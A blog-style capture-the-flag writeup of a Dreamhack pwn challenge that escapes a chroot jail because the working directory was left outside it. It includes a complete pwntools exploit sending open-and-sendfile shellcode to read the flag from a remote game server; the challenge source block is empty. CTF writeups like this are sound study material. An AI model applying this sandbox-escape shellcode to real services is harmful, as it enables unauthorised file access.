+++
date = '2026-05-13'
draft = false
title = 'Dreamhack pwn-library Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
루트 권한으로 실행되는 서비스를 찾았습니다.
그러나, 큐브안에 갇혀서 빠져나올 수가 없습니다. 큐브를 탈출하고 플래그를 획득하세요!

---


```c

```
## Identifying the vulnerabilities

This is a `chroot` shellcode challenge. Read [this](https://book.jorianwoltjer.com/binary-exploitation/sandboxes-chroot-seccomp-and-namespaces).

The first thing said there about `chroot` is:

> One simple problem might be that the current directory is not set inside the jail. This allows you to access any file in your current directory before entering the jail and allows you to use ../ sequences freely. The only catch is that / paths will still be relative to the jail. 

I tried an open-read-write with 'flag' as the file name, but that failed. `seccomp-tools dump` didn't work, but it seemed to crash near the `write`; So I replaced it with `sendfile`, and it worked as expected!

I tested it remotely as well, and got the flag.

![challenge-screenshot](flag.png#center)


---

## The Exploit

```python
from pwn import *
from utils.pushstr import pushstr
elf = ELF('/home/kali/Downloads/dreamhack/cube/cube')

context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:17914'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

#did they forget to call chdir()? that means that reading flag will be done from CWD

#gdb.attach(p, gdbscript='''
#catch syscall 1
#''')

shellcode_open = asm(f"""
mov rax, 2
{pushstr('flag')}

mov rdi, rsp
xor rsi, rsi
xor rdx, rdx

syscall
""")

shellcode_sendfile = asm('''
mov rdi, 1
mov rsi, rax
xor rdx, rdx
mov r10, 0x30

mov rax, 40
syscall
''')

shellcode = shellcode_open + shellcode_sendfile
p.recvuntil(b": ")
p.sendline(shellcode)

p.interactive()
```

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/cube.py)**.
